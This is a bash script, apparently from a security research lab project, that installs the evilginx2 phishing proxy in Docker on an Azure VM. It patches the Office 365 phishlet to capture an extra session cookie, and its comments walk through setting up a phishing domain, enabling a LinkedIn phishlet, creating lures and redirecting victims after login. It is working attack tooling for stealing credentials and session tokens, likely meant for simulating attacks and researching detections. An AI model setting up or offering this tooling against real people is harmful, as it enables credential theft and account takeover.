#!/bin/bash

# Author: Roberto Rodriguez (@Cyb3rWard0g)
# References:
# https://breakdev.org/evilginx-2-1-the-first-post-release-update/

# *********** log tagging variables ***********
INFO_TAG="[INSTALLATION-INFO]"
ERROR_TAG="[INSTALLATION-ERROR]"

# *********** Set Log File ***************
LOGFILE="/var/log/evilginx2-install.log"
echoerror() {
    printf "${RC} * ERROR${EC}: $@\n" 1>&2;
}

# Install Docker and Docker-Compose
if [[ ! -f Install-Docker.sh ]]; then
    wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Docker.sh >> $LOGFILE 2>&1
    chmod +x Install-Docker.sh >> $LOGFILE 2>&1
fi
./Install-Docker.sh >> $LOGFILE 2>&1

# *********** Installing Service ***********
git clone https://github.com/kgretzky/evilginx2 /opt/evilginx2 >> $LOGFILE 2>&1
cd /opt/evilginx2 && docker build -t evilginx2 . >> $LOGFILE 2>&1

# *********** Updating resolved.conf ***********
sed -i "s|^#DNS=$|DNS=168.63.129.16|g" /etc/systemd/resolved.conf # Azure DNS
sed -i "s|^#DNSStubListener=yes$|DNSStubListener=no|g" /etc/systemd/resolved.conf

ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved

# *********** Updating o365 Phishlet ***********
# https://github.com/kgretzky/evilginx2/issues/691
sed -i "s|keys: \['ESTSAUTH', 'ESTSAUTHPERSISTENT'\]|keys: \['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie'\]|g" /opt/evilginx2/phishlets/o365.yaml
sed -i "s|- domain: 'login.microsoftonline.com'|#- domain: 'login.microsoftonline.com'|g" /opt/evilginx2/phishlets/o365.yaml
sed -i "s|keys: \['SignInStateCookie'\]|#keys: \['SignInStateCookie'\]|g" /opt/evilginx2/phishlets/o365.yaml

# *********** Run evilginx2 container ***********
# SSH to VM
# sudo su
# Run EvilGinx2 in developer mode (generates self-signed certificates for all hostnames)
# docker run --rm -it -p 53:53/udp -p 80:80 -p 443:443 --name evilginx2 -v /opt/evilginx2/phishlets:/app/phishlets evilginx2 -developer

# *********** Getting Started ***********
# Reference:
# https://github.com/kgretzky/evilginx2#getting-started
# https://breakdev.org/evilginx-2-1-the-first-post-release-update/

# Set up your server's domain and IP using following commands
# config domain yourdomain.com
# config ip 10.0.0.1

# Now you can set up the phishlet you want to use.
# phishlets hostname linkedin my.phishing.hostname.yourdomain.com
# phishlets get-hosts linkedin

# And now you can enable the phishlet
# phishlets enable linkedin

# Your phishing site is now live. Think of the URL, you want the victim to be redirected to on successful login
# lures create linkedin
# lures edit 0 redirect_url https://www.google.com
# lures get-url 0

# Clear Browser Data (Edge)
# edge://settings/clearBrowserData